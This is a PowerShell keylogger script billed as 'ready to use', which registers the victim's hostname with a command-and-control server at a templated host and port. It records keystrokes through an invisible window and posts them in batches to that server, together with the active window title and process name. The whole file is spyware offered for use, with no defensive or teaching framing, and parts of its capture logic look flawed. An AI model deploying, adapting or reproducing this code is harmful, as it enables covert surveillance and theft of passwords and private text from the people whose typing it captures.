# Keylogger Agent for C2 Server - Ready to Use
# This script captures keystrokes and sends them to the C2 server

# C2 Server Configuration
$C2 = "http://{C2_HOST}:{C2_PORT}"
$hostname = $env:COMPUTERNAME

Write-Host "Starting Keylogger for C2 Server: $C2" -ForegroundColor Green
Write-Host "Hostname: $hostname" -ForegroundColor Cyan

# Function to register with C2 server
function Register-Keylogger {
    try {
        $body = @{
            hostname = $hostname
            type = "keylogger"
            status = "active"
            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        } | ConvertTo-Json
        
        $response = Invoke-RestMethod -Uri "$C2/api/keylogger/register" -Method POST -Body $body -ContentType "application/json"
        Write-Host "✅ Keylogger registered successfully: $response" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Host "❌ Failed to register keylogger: $($_.Exception.Message)" -ForegroundColor Red
        return $false
    }
}

# Function to send keystrokes to C2 server
function Send-Keystrokes {
    param([string]$Keystrokes)
    
    try {
        $body = @{
            hostname = $hostname
            keystrokes = $Keystrokes
            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            window_title = Get-ActiveWindowTitle
            process_name = Get-ActiveProcessName
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri "$C2/api/keylogger/keystrokes" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 5 | Out-Null
        Write-Host "📤 Keystrokes sent: $($Keystrokes.Length) characters" -ForegroundColor Yellow
    }
    catch {
        Write-Host "❌ Failed to send keystrokes: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Function to get active window title
function Get-ActiveWindowTitle {
    try {
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class Win32 {
            [DllImport("user32.dll")]
            public static extern IntPtr GetForegroundWindow();
            
            [DllImport("user32.dll")]
            public static extern int GetWindowText(IntPtr hWnd, System.Text.StringBuilder text, int count);
        }
"@
        
        $hwnd = [Win32]::GetForegroundWindow()
        $title = New-Object System.Text.StringBuilder(256)
        [Win32]::GetWindowText($hwnd, $title, 256)
        return $title.ToString()
    }
    catch {
        return "Unknown"
    }
}

# Function to get active process name
function Get-ActiveProcessName {
    try {
        Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class Win32 {
            [DllImport("user32.dll")]
            public static extern IntPtr GetForegroundWindow();
            
            [DllImport("user32.dll")]
            public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
        }
"@
        
        $hwnd = [Win32]::GetForegroundWindow()
        $processId = 0
        [Win32]::GetWindowThreadProcessId($hwnd, [ref]$processId)
        
        if ($processId -gt 0) {
            $process = Get-Process -Id $processId -ErrorAction SilentlyContinue
            if ($process) {
                return $process.ProcessName
            }
        }
        return "Unknown"
    }
    catch {
        return "Unknown"
    }
}

# Function to capture keystrokes
function Start-Keylogger {
    Write-Host "🎯 Starting keylogger for hostname: $hostname" -ForegroundColor Green
    Write-Host "📡 Sending keystrokes to: $C2" -ForegroundColor Cyan
    
    # Register with C2 server
    if (-not (Register-Keylogger)) {
        Write-Host "❌ Failed to register keylogger. Exiting." -ForegroundColor Red
        return
    }
    
    # Initialize keystroke buffer
    $keystrokeBuffer = ""
    $lastSendTime = Get-Date
    $bufferSize = 50  # Send keystrokes every 50 characters or every 20 seconds
    $totalKeystrokes = 0
    
    try {
        # Load required assemblies
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        
        # Create a hidden form to capture keystrokes
        $form = New-Object System.Windows.Forms.Form
        $form.WindowState = [System.Windows.Forms.FormWindowState]::Minimized
        $form.ShowInTaskbar = $false
        $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
        $form.Opacity = 0
        $form.TopMost = $true
        
        # Add key event handlers
        $form.Add_KeyDown({
            param($sender, $e)
            
            $key = $e.KeyCode.ToString()
            $modifiers = @()
            
            if ($e.Control) { $modifiers += "Ctrl" }
            if ($e.Alt) { $modifiers += "Alt" }
            if ($e.Shift) { $modifiers += "Shift" }
            
            if ($modifiers.Count -gt 0) {
                $key = "[" + ($modifiers -join "+") + "]+" + $key
            }
            
            # Handle special keys
            switch ($key) {
                "Return" { $key = "[ENTER]" }
                "Space" { $key = " " }
                "Back" { $key = "[BACKSPACE]" }
                "Tab" { $key = "[TAB]" }
                "Escape" { $key = "[ESC]" }
                "Delete" { $key = "[DEL]" }
                "Up" { $key = "[UP]" }
                "Down" { $key = "[DOWN]" }
                "Left" { $key = "[LEFT]" }
                "Right" { $key = "[RIGHT]" }
            }
            
            # Add to buffer
            $script:keystrokeBuffer += $key
            $script:totalKeystrokes++
            
            # Check if we should send the buffer
            $currentTime = Get-Date
            if ($script:keystrokeBuffer.Length -ge $bufferSize -or 
                ($currentTime - $script:lastSendTime).TotalSeconds -ge 20) {
                
                if ($script:keystrokeBuffer.Length -gt 0) {
                    Send-Keystrokes -Keystrokes $script:keystrokeBuffer
                    $script:keystrokeBuffer = ""
                    $script:lastSendTime = $currentTime
                }
            }
        })
        
        # Show the form (hidden)
        $form.Show()
        
        # Keep the form alive and capture keystrokes
        Write-Host "🎯 Keylogger is now active! Press Ctrl+C to stop." -ForegroundColor Green
        Write-Host "📊 Total keystrokes captured: $totalKeystrokes" -ForegroundColor Yellow
        
        # Main loop
        while ($true) {
            [System.Windows.Forms.Application]::DoEvents()
            Start-Sleep -Milliseconds 100
            
            # Send any remaining keystrokes in buffer
            if ($keystrokeBuffer.Length -gt 0) {
                $currentTime = Get-Date
                if (($currentTime - $lastSendTime).TotalSeconds -ge 20) {
                    Send-Keystrokes -Keystrokes $keystrokeBuffer
                    $keystrokeBuffer = ""
                    $lastSendTime = $currentTime
                }
            }
            
            # Show status every 10 seconds
            if ((Get-Date - $lastSendTime).TotalSeconds -ge 10) {
                Write-Host "📊 Status: Buffer size: $($keystrokeBuffer.Length), Total captured: $totalKeystrokes" -ForegroundColor Gray
            }
        }
    }
    catch {
        Write-Host "❌ Keylogger error: $($_.Exception.Message)" -ForegroundColor Red
    }
    finally {
        if ($form) {
            $form.Close()
            $form.Dispose()
        }
    }
}

# Function to stop keylogger
function Stop-Keylogger {
    try {
        $body = @{
            hostname = $hostname
            type = "keylogger"
            status = "stopped"
            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
        } | ConvertTo-Json
        
        Invoke-RestMethod -Uri "$C2/api/keylogger/status" -Method POST -Body $body -ContentType "application/json" -TimeoutSec 5 | Out-Null
        Write-Host "🛑 Keylogger stopped and status sent to C2 server" -ForegroundColor Yellow
    }
    catch {
        Write-Host "❌ Failed to send stop status: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# Main execution
try {
    Write-Host "🚀 Initializing Keylogger..." -ForegroundColor Cyan
    
    # Register signal handler for graceful shutdown
    Register-EngineEvent PowerShell.Exiting -Action {
        Write-Host "🛑 PowerShell exiting, stopping keylogger..." -ForegroundColor Yellow
        Stop-Keylogger
    }
    
    # Start the keylogger
    Start-Keylogger
}
catch {
    Write-Host "💥 Fatal error: $($_.Exception.Message)" -ForegroundColor Red
    Stop-Keylogger
}
finally {
    Write-Host "🔄 Cleanup complete" -ForegroundColor Gray
    Stop-Keylogger
}
